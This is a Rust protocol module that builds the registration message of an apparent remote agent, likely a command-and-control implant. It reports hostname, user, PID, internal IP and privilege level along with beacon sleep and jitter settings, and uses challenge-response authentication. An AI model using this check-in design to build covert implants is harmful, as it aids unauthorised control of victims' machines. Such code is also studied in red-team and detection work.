//! Protocol Layer

pub mod config;
pub mod crypto;
pub mod messages;

pub use config::Config;
pub use crypto::{compute_auth_response, hex_encode};
pub use messages::{
    AgentMessage, AgentTaskStatus, CommandOutputStream, ServerCommand, ServerHello,
};

/// Build registration message
pub fn build_register(
    cfg: &Config,
    hello: Option<&ServerHello>,
    sleep_interval: u64,
    jitter: u32,
) -> AgentMessage {
    let (token, auth_response) = match hello {
        Some(h) if h.auth_mode == "challenge_response" => {
            if let Some(ref tok) = cfg.agent_token {
                let resp = compute_auth_response(tok, &h.session_nonce, &cfg.metadata.agent_id);
                (None, resp.ok())
            } else {
                (None, None)
            }
        }
        _ => (cfg.agent_token.clone(), None),
    };

    AgentMessage::Register {
        agent_id: cfg.metadata.agent_id.clone(),
        hostname: cfg.metadata.hostname.clone(),
        username: cfg.metadata.username.clone(),
        protocol_version: 2,
        os: cfg.metadata.os.clone(),
        arch: cfg.metadata.arch.clone(),
        pid: Some(cfg.metadata.pid),
        internal_ip: crate::sys::get_internal_ip(),
        elevated: crate::sys::is_elevated(),
        tags: Vec::new(),
        sleep_interval,
        jitter,
        token,
        session_nonce: hello.map(|h| h.session_nonce.clone()),
        auth_response,
    }
}
